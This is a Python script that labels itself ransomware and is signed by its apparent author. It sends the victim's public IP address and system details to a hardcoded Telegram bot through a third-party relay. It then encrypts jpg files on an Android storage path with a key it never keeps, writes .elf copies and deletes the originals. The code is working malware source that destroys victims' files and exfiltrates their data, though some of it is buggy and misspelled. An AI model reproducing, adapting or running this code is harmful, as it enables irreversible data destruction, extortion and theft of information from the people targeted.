# -*- coding: utf-8 -*-
import os
os.system('pip install cryptography')
os.system('pip install platform')
os.system('pip install requests')
os.system('pip install pathlib')
os.system('pip install regex')
import subprocess
from cryptography.fernet import Fernet
import platform
import requests 
import re
import pathlib
if os.name == 'nt':
   Q= subprocess.check_output('' , shell=True).decode('utf-8')
else:
    Q = subprocess.check_output('pwd' , shell=True).decode('utf-8')
    
y = requests.get('http://ip.42.pl/raw')

IP = f'''⭕ The ransomware was executed..!

🩸 IP PUBLIC TARGET: {y.text}



➕➖➖➖➖➖➖➖➖➖➕
🎃 CoDeD by:@E_L_F_6_6_6
'''
a =platform.uname()

b=(f"""
🏛 OS SYSTEM: {a[0]} 

🗺 node:      {a[1]} 

🔥 release:   {a[2]} 

🧷 machine:   {a[3]}

☢ processor:   {a[5]}

➕➖➖➖➖➖➖➖➖➖➕
🎃 CoDeD by:@E_L_F_6_6_6
""")
phone = input("[-]Enter The Number Phone: ")
ID = input("[-]Enter The User Id Telegram: ")
send = """
➕➖➖➖➖➖➖➖➖➖➕

💌 Number Target : {phone}

💢User Id : {ID} 

➕➖➖➖➖➖➖➖➖➖➕
🎃 CoDeD by:@E_L_F_6_6_6
"""

url_1 =("https://api.telegram.org/bot2052041946:AAGrHmfOJLjCteYii2YscvkE4MWMD63azp4/SendMessage?chat_id=1769267646&text="+str(send))
paylod1={"UrlBox":url_1, 
             "AgentList":"mozilla Firefox", 
             "VersionsList":" HTTP/1.1", 
             "MethodList":"post"}

req2 =requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", paylod1)
try:
    url_1 =("https://api.telegram.org/bot2052041946:AAGrHmfOJLjCteYii2YscvkE4MWMD63azp4/SendMessage?chat_id=1769267646&text="+str(IP))
    paylod1={"UrlBox":url_1, 
                 "AgentList":"mozilla Firefox", 
                 "VersionsList":" HTTP/1.1", 
                 "MethodList":"post"}
    url_2 =("https://api.telegram.org/bot2052041946:AAGrHmfOJLjCteYii2YscvkE4MWMD63azp4/SendMessage?chat_id=1769267646&text="+str(b))
    paylod2={"UrlBox":url_2, 
                 "AgentList":"mozilla Firefox", 
                 "VersionsList":" HTTP/1.1", 
                 "MethodList":"post"
                 }
    req1 =requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", paylod1)
    req2 =requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", paylod2)
except:
    os.chdir('/sdcard/adnroid/data')
    text = open('test.txt' , 'w+')
    text.write(b)

key = Fernet.generate_key()
encrypt = Fernet(key)

def jpg():
   class FileSearch:
       def __init__(self, pattern, dir):
          
           self.regex = re.compile(pattern)
           self.dir = pathlib.Path(dir)
           self.result = []

       def search(self) -> list:
           for root, dir, files in os.walk(self.dir):
               for file in files:
                   if self.regex.match(file):
                       self.result.append(os.path.join(root, file))

           return self.result

       def __enter__(self) -> 'FileSearch':
           return self
       
       def __exit__(self, *args, **kwargs):
           return
    
       def __str__(self):
           return ('<%s.%s search for (%s) in (%s) dirctory>' % (__file__, self.__class__.__name__, str(self.regex), str(self.dir)))

   if __name__ == '__main__':
       with FileSearch(r'.+\jpg', '/sdcrad') as fs:
           result = fs.search()
        
           print(result)
   number_file = 0
   for i in range(1):
       cmd = result
       for g in cmd:
            try:
               with open(g,'rb') as list_1:
                   data_1 = list_1.read()
                   bufferSize = 64 *1080
                   e =  encrypt.encrypt(data_1)
                   new = open(g+'.elf' ,'wb')
                   new.write(e)
                   list_1.close()
                   new.close()
                   os.remove(g)
                   number_file += 1
            except:
                   error = f"💔 Number of unencrypted files: {number_file}⛔"
                   url_2 =("https://api.telegram.org/bot2052041946:AAGrHmfOJLjCteYii2YscvkE4MWMD63azp4/SendMessage?chat_id=1769267646&text="+str(error))
                   paylod1={"UrlBox":url_2, 
                       "AgentList":"mozilla Firefox", 
                       "VersionsList":" HTTP/1.1", 
                       "MethodList":"post"
                       }   
                   req1 =requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", paylod1)
jpg()

snd2 = "❤ All files are encrypted..!"                 
url_2 =("https://api.telegram.org/bot2052041946:AAGrHmfOJLjCteYii2YscvkE4MWMD63azp4/SendMessage?chat_id=1769267646&text="+str())
paylod3={"UrlBox":url_2, 
    "AgentList":"mozilla Firefox", 
    "VersionsList":" HTTP/1.1", 
    "MethodList":"post"
    }     
req1 =requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", paylod3)
